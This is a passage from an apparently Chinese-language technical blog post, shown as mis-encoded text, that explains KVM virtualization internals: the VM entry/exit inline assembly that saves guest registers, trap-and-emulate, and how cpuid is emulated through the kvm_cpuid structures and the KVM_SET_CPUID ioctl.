__ex(ASM_VMX_VMRESUME) <span class="hljs-string">&quot;\n\t&quot;</span>; <span class="hljs-comment">/* å¦‚æœvmx-&gt;launched == 0ï¼Œä½¿ç”¨VMRESUMEæ‰§è¡ŒVM entry */</span><br><br><span class="hljs-number">34</span>         <span class="hljs-string">&quot;.Lkvm_vmx_return: &quot;</span> <span class="hljs-comment">/* æ ‡ç­¾ .Lkvm_vmx_return */</span><br><br><span class="hljs-number">35</span>         <span class="hljs-comment">/* ä¿å­˜å®¢æˆ·æœºå¯„å­˜å™¨ï¼ŒåŠ è½½å®¿ä¸»æœºå¯„å­˜å™¨ï¼Œä¿æŒ... */</span><br><span class="hljs-number">36</span>         <span class="hljs-string">&quot;xchg %0, (%%&quot;</span>R<span class="hljs-string">&quot;sp) \n\t&quot;</span>; <span class="hljs-comment">/* äº¤æ¢vmxæŒ‡é’ˆä¸æ ˆé¡¶çš„å€¼ (vmx-&gt;host_rsp) */</span><br><span class="hljs-number">37</span>         <span class="hljs-string">&quot;mov %%&quot;</span>R<span class="hljs-string">&quot;ax, %c[rax](%0) \n\t&quot;</span>; <span class="hljs-comment">/* å°†RAXçš„å€¼å­˜å‚¨åˆ°vcpu.arch.regs[VCPU_REGS_RAX] */</span><br><span class="hljs-number">38</span>         <span class="hljs-string">&quot;mov %%&quot;</span>R<span class="hljs-string">&quot;bx, %c[rbx](%0) \n\t&quot;</span>; <span class="hljs-comment">/* å°†RBXçš„å€¼å­˜å‚¨åˆ°vcpu.arch.regs[VCPU_REGS_RBX] */</span><br><span class="hljs-number">39</span>         <span class="hljs-string">&quot;pop&quot;</span>Q<span class="hljs-string">&quot; %c[rcx](%0) \n\t&quot;</span>; <span class="hljs-comment">/* å°†æ ˆé¡¶çš„å€¼ (vmx-&gt;host_rsp) å¼¹å‡ºåˆ°RCX */</span><br><span class="hljs-number">40</span>         <span class="hljs-string">&quot;mov %%&quot;</span>R<span class="hljs-string">&quot;dx, %c[rdx](%0) \n\t&quot;</span>; <span class="hljs-comment">/* å°†RDXçš„å€¼å­˜å‚¨åˆ°vcpu.arch.regs[VCPU_REGS_RDX] */</span><br><span class="hljs-number">41</span>         <span class="hljs-comment">/* ... å…¶ä»–å®¢æˆ·æœºå¯„å­˜å™¨å­˜å‚¨ ... */</span><br><span class="hljs-number">42</span>         <span class="hljs-string">&quot;mov %%cr2, %%&quot;</span>R<span class="hljs-string">&quot;ax \n\t&quot;</span>; <span class="hljs-comment">/* å°†å½“å‰çš„cr2å€¼åŠ è½½åˆ°RAX */</span><br><span class="hljs-number">43</span>         <span class="hljs-string">&quot;mov %%&quot;</span>R<span class="hljs-string">&quot;ax, %c[cr2](%0) \n\t&quot;</span>; <span class="hljs-comment">/* å°†RAXçš„å€¼å­˜å‚¨åˆ°vmx-&gt;cr2 */</span><br><br><span class="hljs-number">44</span>         <span class="hljs-string">&quot;pop %%&quot;</span>R<span class="hljs-string">&quot;bp; pop %%&quot;</span>R<span class="hljs-string">&quot;dx \n\t&quot;</span>; <span class="hljs-comment">/* å¼¹å‡ºæ ˆä¸­çš„RBPå’ŒRDXçš„å€¼ */</span><br><span class="hljs-number">45</span>         <span class="hljs-string">&quot;setbe %c[fail](%0) \n\t&quot;</span>; <span class="hljs-comment">/* å¦‚æœè¿›ä½æ ‡å¿—ä½è®¾ç½® (å‘ç”Ÿä»»ä½•é”™è¯¯), è®¾ç½®vmx-&gt;failæ ‡å¿— */</span><br><span class="hljs-number">46</span>         : : <span class="hljs-string">&quot;c&quot;</span>(vmx), <span class="hljs-string">&quot;d&quot;</span>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)HOST_RSP),<br><span class="hljs-number">47</span>         [launched]<span class="hljs-string">&quot;i&quot;</span>(offsetof(struct vcpu_vmx, launched)),<br><span class="hljs-number">48</span>         [fail]<span class="hljs-string">&quot;i&quot;</span>(offsetof(struct vcpu_vmx, fail)),<br><span class="hljs-number">49</span>         [host_rsp]<span class="hljs-string">&quot;i&quot;</span>(offsetof(struct vcpu_vmx, host_rsp)),<br><span class="hljs-number">50</span>         [rax]<span class="hljs-string">&quot;i&quot;</span>(offsetof(struct vcpu_vmx, vcpu.arch.regs[VCPU_REGS_RAX])),<br><span class="hljs-number">51</span>         [rbx]<span class="hljs-string">&quot;i&quot;</span>(offsetof(struct vcpu_vmx, vcpu.arch.regs[VCPU_REGS_RBX])),<br><span class="hljs-number">52</span>         <span class="hljs-comment">/* ... å…¶ä»–å®¢æˆ·æœºå¯„å­˜å™¨çš„åç§»é‡ ... */</span><br><span class="hljs-number">53</span>         [rcx]<span class="hljs-string">&quot;i&quot;</span>(offsetof(struct vcpu_vmx, vcpu.arch.regs[VCPU_REGS_RCX])),<br><span class="hljs-number">54</span>         [rdx]<span class="hljs-string">&quot;i&quot;</span>(offsetof(struct vcpu_vmx, vcpu.arch.regs[VCPU_REGS_RDX])),<br><span class="hljs-number">55</span>         <span class="hljs-comment">/* ... å…¶ä»–å®¢æˆ·æœºå¯„å­˜å™¨çš„åç§»é‡ ... */</span><br><span class="hljs-number">56</span>         [cr2]<span class="hljs-string">&quot;i&quot;</span>(offsetof(struct vcpu_vmx, vcpu.arch.cr2))<br><span class="hljs-number">57</span>         : <span class="hljs-string">&quot;cc&quot;</span>, <span class="hljs-string">&quot;memory&quot;</span><br><span class="hljs-number">58</span>         , R<span class="hljs-string">&quot;ax&quot;</span>, R<span class="hljs-string">&quot;bx&quot;</span>, R<span class="hljs-string">&quot;di&quot;</span>, R<span class="hljs-string">&quot;si&quot;</span><br><span class="hljs-number">59</span>         <span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> CONFIG_X86_64</span><br><span class="hljs-number">60</span>         , <span class="hljs-string">&quot;r8&quot;</span>, <span class="hljs-string">&quot;r9&quot;</span>, <span class="hljs-string">&quot;r10&quot;</span>, <span class="hljs-string">&quot;r11&quot;</span>, <span class="hljs-string">&quot;r12&quot;</span>, <span class="hljs-string">&quot;r13&quot;</span>, <span class="hljs-string">&quot;r14&quot;</span>, <span class="hljs-string">&quot;r15&quot;</span> <span class="hljs-comment">/* åœ¨x86_64æ¶æ„ä¸Šï¼Œè¿˜åŒ…å«å…¶ä»–å¯„å­˜å™¨çš„çº¦æŸ */</span><br><span class="hljs-number">61</span>         <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-number">62</span>     );<br><span class="hljs-number">63</span>     <span class="hljs-comment">/* ... å…¶ä»–ä»£ç  ... */</span><br><span class="hljs-number">64</span> &#125;<br><br><br></code></pre></td></tr></table></figure><ul><li>line 7 . KVMå°†å®¿ä¸»æœºçš„é€šç”¨å¯„å­˜å™¨ä¿å­˜åˆ°æ ˆä¸­ã€‚å½“å‘ç”ŸVMé€€å‡ºæ—¶ï¼ŒKVMä»æ ˆä¸­å°†è¿™äº›ä¿å­˜çš„å®¿ä¸»æœºçš„é€šç”¨å¯„å­˜å™¨æ¢å¤åˆ°CPUçš„ç‰©ç†å¯„å­˜å™¨ä¸­ã€‚è¿™é‡Œï¼Œå®Råœ¨64ä½ä¸‹å€¼ä¸ºrï¼Œ32ä½ä¸‹ä¸ºeã€‚</li><li>rdx/edxå¯„å­˜å™¨æ˜¯GCCä¿ç•™çš„regparmç‰¹æ€§ï¼Œä¸èƒ½æ”¾åœ¨clobber listä¸­ï¼Œå¦å¤–ä¸€ä¸ªrbp/ebpå¯„å­˜å™¨ä¹Ÿä¸ç”Ÿæ•ˆï¼Œæ‰€ä»¥KVMæ‰‹åŠ¨ä¿å­˜äº†è¿™ä¸¤ä¸ªå¯„å­˜å™¨</li><li>ä»Guesté€€å‡ºåˆ°Hostæ—¶ï¼ŒCPUä¸ä¼šè‡ªåŠ¨ä¿å­˜guestçš„é€šç”¨å¯„å­˜å™¨ç­‰å¯„å­˜å™¨ï¼ŒKVMæ‰‹åŠ¨å°†å…¶ä¿å­˜åˆ°äº†ç»“æ„ä½“vcpu_vmxä¸­çš„å­ç»“æ„ä½“ä¸­ã€‚å› æ­¤ï¼Œåœ¨Guesté€€å‡ºçš„é‚£ä¸€åˆ»ï¼Œé¦–å…ˆå¿…é¡»è¦è·å–ç»“æ„ä½“vcpu_vmxçš„å®ä¾‹ï¼Œä¹Ÿå°±æ˜¯ç¬¬3è¡Œä»£ç ä¸­çš„å˜é‡vmxï¼Œ<strong>å°†CPUå¯„å­˜å™¨ä¸­çš„çŠ¶æ€ä¿å­˜åˆ°è¿™ä¸ªvmxä¸­</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ä¿å­˜å®ŒGuestçš„çŠ¶æ€åï¼Œæ‰èƒ½è¿›è¡Œå…¶ä»–æ“ä½œï¼Œé¿å…ç ´åGuestçš„çŠ¶æ€ã€‚äºæ˜¯ï¼Œæ¯æ¬¡ä»Hoståˆ‡å…¥Guestå‰çš„æœ€åä¸€åˆ»ï¼ŒKVMå°†vmxçš„åœ°å€å‹å…¥æ ˆé¡¶ï¼Œç„¶ååœ¨Guesté€€å‡ºæ—¶ä»æ ˆé¡¶ç¬¬ä¸€æ—¶é—´å–å‡ºvmxã€‚</li><li>å¦‚ä½•å°†vmxå‹å…¥æ ˆé¡¶å‘¢ï¼Ÿå‚è§ç¬¬47è¡Œä»£ç ï¼Œè¿™é‡Œä½¿ç”¨äº†GCCå†…è”æ±‡ç¼–çš„inputçº¦æŸï¼Œå³åœ¨æ‰§è¡Œæ±‡ç¼–ä»£ç å‰ï¼Œå‘Šè¯‰ç¼–è¯‘å™¨å°†å˜é‡vmxåŠ è½½åˆ°rcx/ecxå¯„å­˜å™¨ï¼Œé‚£ä¹ˆåœ¨æ‰§è¡Œç¬¬8è¡Œä»£ç ï¼Œå³å°†rcx/ecxå¯„å­˜å™¨çš„å†…å®¹å‹å…¥æ ˆæ—¶ï¼Œå®é™…ä¸Šæ˜¯å°†å˜é‡vmxå‹å…¥æ ˆé¡¶äº†ã€‚</li><li>åœ¨Guest<strong>é€€å‡º</strong>æ—¶ï¼ŒCPUä¼šè‡ªåŠ¨<strong>å°†VMCSä¸­Hostçš„rsp/espå¯„å­˜å™¨æ¢å¤åˆ°ç‰©ç†CPUçš„rsp/espå¯„å­˜å™¨ä¸­</strong>ï¼Œæ‰€ä»¥æ­¤æ—¶å¯ä»¥<strong>è®¿é—®VCPUçº¿ç¨‹åœ¨Hostæ€ä¸‹çš„æ ˆ</strong>ã€‚</li><li>åœ¨Guesté€€å‡ºåçš„ç¬¬1è¡Œä»£ç ï¼Œå³ç¬¬36è¡Œä»£ç ï¼Œè°ƒç”¨xchgæŒ‡ä»¤å°†æ ˆé¡¶çš„å€¼å’Œåºå·%0æŒ‡ä»£çš„å˜é‡è¿›è¡Œäº¤æ¢ï¼Œæ ¹æ®ç¬¬47è¡Œä»£ç å¯è§ï¼Œ%0æŒ‡ä»£å˜é‡vmxï¼Œå¯¹åº”çš„å¯„å­˜å™¨æ˜¯rcx/ecxï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™è¡Œä»£ç å°†åˆ‡å…¥Guestä¹‹å‰ä¿å­˜åˆ°æ ˆé¡¶çš„å˜é‡vmxçš„åœ°å€æ¢å¤åˆ°äº†rcx/ecxå¯„å­˜å™¨ä¸­ï¼Œ%0å¼•ç”¨çš„ä¹Ÿæ˜¯è¿™ä¸ªåœ°å€ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨%0å¼•ç”¨è¿™ä¸ªåœ°å€ä¿å­˜Guestçš„å¯„å­˜å™¨äº†ã€‚</li></ul><p>è¿™é‡Œä¸Šä¸‹æ–‡æœ‰ç‚¹éº»çƒ¦ï¼Œè¯¦è§ä¹¦ä¸Šå§</p><h2 id="1-3é™·å…¥å’Œæ¨¡æ‹Ÿ"><a href="#1-3é™·å…¥å’Œæ¨¡æ‹Ÿ" class="headerlink" title="1.3é™·å…¥å’Œæ¨¡æ‹Ÿ"></a>1.3é™·å…¥å’Œæ¨¡æ‹Ÿ</h2><ol><li>è™šæ‹Ÿæœºå¹¶ä¸ä¼šä¸€ç›´ä¿æŒåœ¨Guestæ¨¡å¼ï¼Œè€Œæ˜¯éœ€è¦åœ¨æŸäº›æƒ…å†µä¸‹åˆ‡æ¢åˆ°Hostæ¨¡å¼ã€‚åœ¨Hostè§’åº¦çœ‹ï¼Œè™šæ‹Ÿæœºå°±åƒæ˜¯Hostä¸Šçš„ä¸€ä¸ªè¿›ç¨‹ï¼Œä¸å…¶ä»–è™šæ‹Ÿæœºä¸€åŒå…±äº«ç³»ç»Ÿèµ„æºã€‚</li><li>è™šæ‹Ÿæœºè®¿é—®ç³»ç»Ÿèµ„æºæ—¶ï¼Œå¯èƒ½éœ€è¦é€€å‡ºåˆ°Hostæ¨¡å¼ï¼Œè®©VMMï¼ˆè™šæ‹Ÿæœºç›‘æ§å™¨ï¼‰ä»£ä¸ºå®Œæˆèµ„æºè®¿é—®ã€‚ä¾‹å¦‚ï¼Œè™šæ‹Ÿæœºè¿›è¡ŒI/Oè®¿é—®æ—¶ï¼ŒVMMä¼šå¤„ç†å®é™…çš„æ–‡ä»¶è¯»å†™æˆ–ç½‘ç»œä¼ è¾“ã€‚ç±»ä¼¼åœ°ï¼Œè®¿é—®è®¾å¤‡I/Oå†…å­˜æ˜ å°„çš„åœ°å€ç©ºé—´å¯èƒ½ä¼šè§¦å‘é¡µé¢å¼‚å¸¸ï¼Œéœ€è¦KVMä»‹å…¥æ¨¡æ‹Ÿè®¾å¤‡å¤„ç†ã€‚</li><li>è™šæ‹Ÿæœºé€šå¸¸ä¸ä¼šç›´æ¥å‘ˆç°Hostçš„CPUä¿¡æ¯ï¼Œè€Œæ˜¯æ¨¡æ‹Ÿç‰¹å®šçš„CPUå‹å·ã€‚è¿™æ„å‘³ç€æŸäº›æŒ‡ä»¤å¦‚cpuidåœ¨Guestæ¨¡å¼ä¸‹æ— æ³•æ‰§è¡Œï¼Œéœ€è¦KVMä»‹å…¥æ¨¡æ‹Ÿè¿™äº›æŒ‡ä»¤ã€‚</li><li>é™·å…¥ï¼ˆæˆ–ä¸­æ–­ï¼‰å¯ä»¥æ˜¯è™šæ‹Ÿæœºä¸»åŠ¨è§¦å‘çš„ï¼Œæ¯”å¦‚è™šæ‹Ÿæœºä¸»åŠ¨è¯·æ±‚Hostæ¥å®ŒæˆæŸäº›ä»»åŠ¡ï¼Œä¹Ÿå¯ä»¥æ˜¯è¢«åŠ¨è§¦å‘çš„ï¼Œæ¯”å¦‚å¤–éƒ¨æ—¶é’Ÿä¸­æ–­æˆ–å¤–è®¾ä¸­æ–­ã€‚è¢«åŠ¨è§¦å‘çš„é™·å…¥é€šå¸¸æ˜¯éœ€è¦å°†CPUèµ„æºè®©ç»™Hostæˆ–è¿›è¡Œç‰¹å®šå¤„ç†çš„æƒ…å†µã€‚</li></ol><h3 id="1-3-2-ç‰¹æ®ŠæŒ‡ä»¤"><a href="#1-3-2-ç‰¹æ®ŠæŒ‡ä»¤" class="headerlink" title="1.3.2 ç‰¹æ®ŠæŒ‡ä»¤"></a>1.3.2 ç‰¹æ®ŠæŒ‡ä»¤</h3><p>åœ¨è™šæ‹ŸåŒ–ç¯å¢ƒä¸­ï¼Œå­˜åœ¨ä¸€äº›æŒ‡ä»¤åœ¨æœºåˆ¶ä¸Šå¯ä»¥ç›´æ¥åœ¨è™šæ‹Ÿæœºçš„Guestæ¨¡å¼ä¸‹æœ¬åœ°è¿è¡Œï¼Œä½†æ˜¯å®ƒä»¬åœ¨<strong>è™šæ‹ŸåŒ–ä¸Šä¸‹æ–‡ä¸­çš„è¯­ä¹‰ä¸éè™šæ‹ŸåŒ–ç¯å¢ƒä¸‹</strong>å®Œå…¨ä¸åŒã€‚ä¸¤ä¸ªä¸»è¦çš„ä¾‹å­æ˜¯cpuidæŒ‡ä»¤å’ŒhltæŒ‡ä»¤ï¼š</p><p><strong>cpuid</strong></p><p>åœ¨è™šæ‹ŸåŒ–ç¯å¢ƒä¸­ï¼Œå¯¹äºcpuidæŒ‡ä»¤çš„æ¨¡æ‹Ÿæ˜¯å¿…è¦çš„ï¼Œ<strong>å› ä¸ºç›´æ¥åœ¨Guestæ¨¡å¼ä¸‹è¿è¡Œè¯¥æŒ‡ä»¤ä¼šå¯¼è‡´è·å–çš„æ˜¯å®¿ä¸»æœºç‰©ç†CPUçš„å„ç§ç‰¹æ€§</strong></p><p>ä¸ºäº†ä¿è¯è™šæ‹Ÿæœºè·å¾—æ­£ç¡®ã€ä¸€è‡´çš„CPUç‰¹æ€§ä¿¡æ¯ï¼ŒcpuidæŒ‡ä»¤åœ¨è™šæ‹ŸåŒ–ç¯å¢ƒä¸­éœ€è¦è¢«æ‹¦æˆªå¹¶è¿›è¡Œæ¨¡æ‹Ÿï¼Œä»¥ç¡®ä¿è™šæ‹Ÿæœºèƒ½å¤Ÿåœ¨å„ç§ç¯å¢ƒä¸‹ç¨³å®šè¿è¡Œï¼Œå¹¶ä¸”è·å¾—ä¸å®é™…æƒ…å†µç›¸ç¬¦çš„CPUç‰¹æ€§ä¿¡æ¯ã€‚</p><ul><li>è™šæ‹ŸåŒ–ç›‘æ§å™¨ï¼ˆVMMï¼‰éœ€è¦åœ¨è™šæ‹Ÿæœºæ‰§è¡ŒcpuidæŒ‡ä»¤æ—¶ä»‹å…¥ï¼Œæ¨¡æ‹ŸCPUçš„ç‰¹æ€§ä¿¡æ¯ã€‚ç”±äºVMMåœ¨è™šæ‹ŸåŒ–å±‚é¢è¿›è¡Œæ¨¡æ‹Ÿï¼Œå› æ­¤<strong>æ¨¡æ‹Ÿçš„CPUå¯èƒ½æ”¯æŒæ›´å¤šçš„ç‰¹æ€§ï¼Œä¸ç‰©ç†CPUä¸å®Œå…¨ä¸€è‡´</strong>ã€‚VMMéœ€è¦åœ¨æ‰§è¡ŒcpuidæŒ‡ä»¤æ—¶è¿”å›<strong>è™šæ‹ŸCPUçš„ç‰¹æ€§</strong>ï¼Œä»¥ä¿è¯è™šæ‹Ÿæœºè·å¾—æ­£ç¡®çš„ç‰¹æ€§ä¿¡æ¯ã€‚</li><li><strong>è™šæ‹Ÿæœºå¯èƒ½</strong>ä¼šåœ¨ä¸åŒçš„å®¿ä¸»æœºä¹‹é—´<strong>è¿ç§»</strong>ï¼Œä¸ºäº†<strong>ç¡®ä¿è™šæ‹Ÿæœº</strong>èƒ½å¤Ÿ<strong>åœ¨ä¸åŒç¯å¢ƒä¸‹ä¸€è‡´åœ°è¿è¡Œ</strong>ï¼ŒcpuidæŒ‡ä»¤éœ€è¦é™·å…¥VMMè¿›è¡Œç‰¹æ®Šå¤„ç†ã€‚è¿™æ„å‘³ç€æ— è®ºè™šæ‹Ÿæœºåœ¨å“ªä¸ªç‰©ç†ä¸»æœºä¸Šè¿è¡Œï¼Œ<strong>å…¶è·å–çš„CPUç‰¹æ€§ä¿¡æ¯éƒ½åº”è¯¥ä¿æŒä¸€è‡´</strong>ï¼Œä»¥é¿å…åº”ç”¨ç¨‹åºå› ç‰¹æ€§å·®å¼‚è€Œå—åˆ°å½±å“ã€‚</li></ul><p>KVMçš„<strong>ç”¨æˆ·ç©ºé—´</strong>é€šè¿‡cpuidæŒ‡ä»¤<strong>è·å–Hostçš„CPUç‰¹å¾</strong>ï¼ŒåŠ ä¸Šç”¨æˆ·ç©ºé—´çš„<strong>é…ç½®</strong>ï¼Œå®šä¹‰å¥½VCPUæ”¯æŒçš„CPU<strong>ç‰¹æ€§</strong>ï¼Œ<strong>ä¼ é€’ç»™KVMå†…æ ¸æ¨¡å—</strong>ã€‚</p><p>KVMæ¨¡å—åœ¨å†…æ ¸ä¸­å®šä¹‰äº†æ¥æ”¶æ¥è‡ªç”¨æˆ·ç©ºé—´å®šä¹‰çš„CPUç‰¹æ€§çš„ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">commit <span class="hljs-number">06465</span>c5a3aa9948a7b00af49cd22ed8f235cdb0f<br>KVM: Handle cpuid in the kernel instead of punting to<br>userspace<br>linux.git/include/linux/kvm.h<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_cpuid_entry</span> &#123;</span><br>__u32 function;<br>__u32 eax;<br>__u32 ebx;<br>__u32 ecx;<br>__u32 edx;<br>__u32 padding;<br>&#125;;<br></code></pre></td></tr></table></figure><p>ç”¨æˆ·ç©ºé—´æŒ‰ç…§å¦‚ä¸‹ç»“æ„ä½“kvm_cpuidçš„æ ¼å¼ç»„ç»‡å¥½CPUç‰¹æ€§åï¼Œé€šè¿‡å¦‚ä¸‹KVMæ¨¡å—æä¾›çš„æ¥å£ä¼ é€’ç»™KVMå†…æ ¸æ¨¡å—ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c">commit <span class="hljs-number">06465</span>c5a3aa9948a7b00af49cd22ed8f235cdb0f<br>KVM: Handle cpuid in the kernel instead of punting to userspace<br>linux.git/include/linux/kvm.h<br><br><span class="hljs-comment">/* å®šä¹‰ä¼ é€’CPUç‰¹æ€§çš„ç»“æ„ä½“ */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_cpuid</span> &#123;</span><br>    __u32 nent; <span class="hljs-comment">/* ç‰¹æ€§æ¡ç›®æ•°é‡ */</span><br>    __u32 padding;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_cpuid_entry</span> <span class="hljs-title">entries</span>[0];</span> <span class="hljs-comment">/* ç‰¹æ€§æ¡ç›®æ•°ç»„ å¯å˜é•¿åº¦æ•°ç»„ï¼Œå­˜å‚¨å®é™…çš„ CPU ç‰¹æ€§ä¿¡æ¯*/</span><br>&#125;;<br><br>linux.git/drivers/kvm/kvm_main.<span class="hljs-function">c</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-title">kvm_vcpu_ioctl</span><span class="hljs-params">(struct file *filp, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ioctl, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// ...</span><br>    <span class="hljs-keyword">case</span> KVM_SET_CPUID: &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_cpuid</span> __<span class="hljs-title">user</span> *<span class="hljs-title">cpuid_arg</span> =</span> argp;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_cpuid</span> <span class="hljs-title">cpuid</span>;</span><br><br>        <span class="hljs-comment">// ä»ç”¨æˆ·ç©ºé—´å¤åˆ¶ä¼ å…¥çš„CPUç‰¹æ€§ç»“æ„ä½“</span><br>        <span class="hljs-keyword">if</span> (copy_from_user(&amp;cpuid, cpuid_arg, <span class="hljs-keyword">sizeof</span>(cpuid)))<br>            <span class="hljs-keyword">goto</span> out;<br><br>        <span class="hljs-comment">// è°ƒç”¨å‡½æ•°è®¾ç½®VCPUçš„CPUç‰¹æ€§</span><br>        r = kvm_vcpu_ioctl_set_cpuid(vcpu, &amp;cpuid, cpuid_arg-&gt;entries);<br>        <span class="hljs-comment">// ...</span><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">kvm_vcpu_ioctl_set_cpuid</span><span class="hljs-params">(struct kvm_vcpu *vcpu, struct kvm_cpuid *cpuid,</span></span><br><span class="hljs-params"><span class="hljs-function">                                   struct kvm_cpuid_entry __user *entries)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// ...</span><br>    <span class="hljs-comment">// ä»ç”¨æˆ·ç©ºé—´å¤åˆ¶ç‰¹æ€§æ¡ç›®æ•°ç»„åˆ°VCPUçš„ç‰¹æ€§æ¡ç›®æ•°ç»„</span><br>    <span class="hljs-keyword">if</span> (copy_from_user(&amp;vcpu-&gt;cpuid_entries, entries, cpuid-&gt;nent * <span class="hljs-keyword">sizeof</span>(struct kvm_cpuid_entry)))<br>        <span class="hljs-comment">// ...</span><br>    <span class="hljs-comment">// ...</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>ä¸‹é¢è¿™æ®µä»£ç ç”¨äºåœ¨è™šæ‹ŸåŒ–ç¯å¢ƒä¸­æ¨¡æ‹Ÿå¤„ç†è™šæ‹Ÿæœºæ‰§è¡Œ <code>cpuid</code> æŒ‡ä»¤çš„æƒ…å†µã€‚é€šè¿‡<strong>éå†</strong>è™šæ‹Ÿæœºæä¾›çš„ <code>cpuid_entries</code> æ•°ç»„ï¼ŒKVM åœ¨å…¶ä¸­<strong>æŸ¥æ‰¾ä¸å½“å‰åŠŸèƒ½å·åŒ¹é…</strong>çš„ç‰¹æ€§ä¿¡æ¯ï¼Œå°†åŒ¹é…çš„ç‰¹æ€§ä¿¡æ¯çš„å­—æ®µå€¼åŠ è½½åˆ°è™šæ‹Ÿ CPU å¯„å­˜å™¨ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* ä»£ç ç‰‡æ®µç”¨äºæ¨¡æ‹Ÿè™šæ‹Ÿæœºæ‰§è¡Œ cpuid æŒ‡ä»¤çš„æƒ…å†µ */</span><br><br><span class="hljs-comment">/* KVM æ¨¡æ‹Ÿå¤„ç†è™šæ‹Ÿæœºä¸­çš„ cpuid æŒ‡ä»¤ */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">kvm_emulate_cpuid</span><span class="hljs-params">(struct kvm_vcpu *vcpu)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    u32 function;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_cpuid_entry</span> *<span class="hljs-title">e</span>, *<span class="hljs-title">best</span>;</span><br><br>    <span class="hljs-comment">/* ä»è™šæ‹Ÿ CPU å¯„å­˜å™¨ä¸­è·å– cpuid æŒ‡ä»¤çš„åŠŸèƒ½å· */</span><br>    function = vcpu-&gt;regs[VCPU_REGS_RAX];<br><br>    <span class="hljs-comment">/* éå† cpuid_entries æ•°ç»„æŸ¥æ‰¾åŒ¹é…çš„ç‰¹æ€§ä¿¡æ¯ */</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; vcpu-&gt;cpuid_nent; ++i) &#123;<br>        e = &amp;vcpu-&gt;cpuid_entries[i];<br>        <span class="hljs-keyword">if</span> (e-&gt;function == function) &#123;<br>            best = e; <span class="hljs-comment">/* æ‰¾åˆ°ä¸åŠŸèƒ½å·åŒ¹é…çš„ç‰¹æ€§ä¿¡æ¯ */</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">/* ... å…¶ä»–ç‰¹æ€§ä¿¡æ¯çš„åŒ¹é…åˆ¤æ–­ ... */</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (best) &#123;<br>        <span class="hljs-comment">/* å°†ç‰¹æ€§ä¿¡æ¯ä¸­çš„å­—æ®µå€¼å¤åˆ¶åˆ°è™šæ‹Ÿ CPU å¯„å­˜å™¨ */</span><br>        vcpu-&gt;regs[VCPU_REGS_RAX] = best-&gt;eax;<br>        vcpu-&gt;regs[VCPU_REGS_RBX] = best-&gt;ebx;<br>        vcpu-&gt;regs[VCPU_REGS_RCX] = best-&gt;ecx;<br>        vcpu-&gt;regs[VCPU_REGS_RDX] = best-&gt;edx;<br>    &#125;<br><br>    <span class="hljs-comment">/* 